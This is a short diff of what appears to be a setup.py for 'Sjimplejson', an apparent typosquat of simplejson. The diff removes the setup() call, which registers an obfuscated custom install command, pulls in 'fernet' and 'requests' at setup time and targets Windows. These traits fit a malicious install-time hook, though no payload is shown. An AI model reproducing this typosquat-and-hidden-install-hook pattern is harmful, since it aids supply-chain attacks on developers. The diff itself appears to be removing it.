@@ -18,22 +18,5 @@ class UzkTYKlBHriOmnxIPQvqlDqvwncJaEUuJXvEbzFegcBZmGcShlzMBIEAZOoLCcBswmyBvvqyZu
             install.run(self)
 
 
-setup(
-    name="Sjimplejson",
-    version=VERSION,
-    author="uaGpXTKklqDhcxyxQfQ",
-    author_email="mYATXgAb@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': UzkTYKlBHriOmnxIPQvqlDqvwncJaEUuJXvEbzFegcBZmGcShlzMBIEAZOoLCcBswmyBvvqyZuURhXDwYthPpQQefXZxjahtRsGdGVKBichKFmXiAAjgPmrohsvGHhrgcqLqKIlLGshdgbsVtbpwupMMnUvrKHYyHXVDqOyNmwb,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
 
